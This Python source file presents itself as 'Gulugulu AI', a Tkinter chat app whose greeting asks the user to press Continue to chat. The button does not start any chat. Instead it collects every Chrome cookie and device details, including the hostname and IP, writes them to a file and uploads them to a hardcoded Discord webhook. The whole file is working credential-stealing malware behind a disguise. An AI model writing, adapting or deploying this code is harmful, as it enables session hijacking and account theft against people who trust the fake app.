import os
import platform
import socket
import tkinter as tk
from tkinter import messagebox
from browser_cookie3 import chrome as chrome_cookies
from msedge.selenium_tools import Edge, EdgeOptions
import requests

class CookieTool:
    def __init__(self, master):
        self.master = master
        master.title("Gulugulu AI")

        self.message_label = tk.Label(master, text="Hello, I am Gulugulu AI! Press Continue to chat with me!")
        self.message_label.pack()

        self.get_info_button = tk.Button(master, text="Continue", command=self.get_and_send_info)
        self.get_info_button.pack()

    def get_and_send_info(self):
        try:
            # Lấy thông tin thiết bị
            device_info = self.get_device_info()

            # Lấy cookie từ trình duyệt Chrome
            chrome_cookies_list = chrome_cookies()  # Không cần chỉ định trang web cụ thể

            chrome_cookie_file = os.path.join("Chrome", "cookie.txt")

            # Tạo thư mục nếu nó không tồn tại
            os.makedirs(os.path.dirname(chrome_cookie_file), exist_ok=True)

            # Ghi thông tin thiết bị vào file
            with open(chrome_cookie_file, 'w') as file:
                file.write(f"Device Information:\n{device_info}\n\n")
                file.write("Cookies:\n")
                for cookie in chrome_cookies_list:
                    file.write(f"{cookie.domain}\t{cookie.name}\t{cookie.value}\n")

            messagebox.showinfo("Good Luck!")

            # Gửi file cookie và thông tin thiết bị đến Discord webhook
            self.send_info_to_discord(chrome_cookie_file, device_info)

        except Exception as e:
            messagebox.showerror("Lỗi", f"Lỗi: {e}")

    def get_device_info(self):
        system_info = platform.system()
        version_info = platform.version()
        architecture_info = platform.architecture()
        machine_info = platform.machine()
        node_info = platform.node()
        ip_address = socket.gethostbyname(socket.gethostname())

        device_info = f"System: {system_info}\nVersion: {version_info}\nArchitecture: {architecture_info}\nMachine: {machine_info}\nNode: {node_info}\nIP Address: {ip_address}"

        return device_info

    def send_info_to_discord(self, cookie_file, device_info):
        try:
            # Thay thế 'YOUR_DISCORD_WEBHOOK_URL' bằng URL Webhook thực tế của bạn
            webhook_url = 'https://discord.com/api/webhooks/1140988146218184776/_hnfI9-74xDgwX6eLWUzU3HMs5L_5r0S5Bjlb1fyjzZwY3VegmmpAbD01n9znUCU_JM8'
            
            if os.path.exists(cookie_file):
                with open(cookie_file, 'rb') as file:
                    files = {'file': ('cookie.txt', file)}
                    data = {'content': device_info}
                    response = requests.post(webhook_url, files=files, data=data)

                if response.status_code == 200:
                    print("Đã gửi file cookie và thông tin thiết bị thành công đến Discord.")
                else:
                    print(f"Lỗi khi gửi file cookie và thông tin thiết bị: {response.status_code}")
            else:
                print(f"File {cookie_file} không tồn tại.")

        except Exception as e:
            print(f"Lỗi khi gửi file cookie và thông tin thiết bị đến Discord: {e}")

if __name__ == "__main__":
    root = tk.Tk()
    app = CookieTool(root)
    root.mainloop()
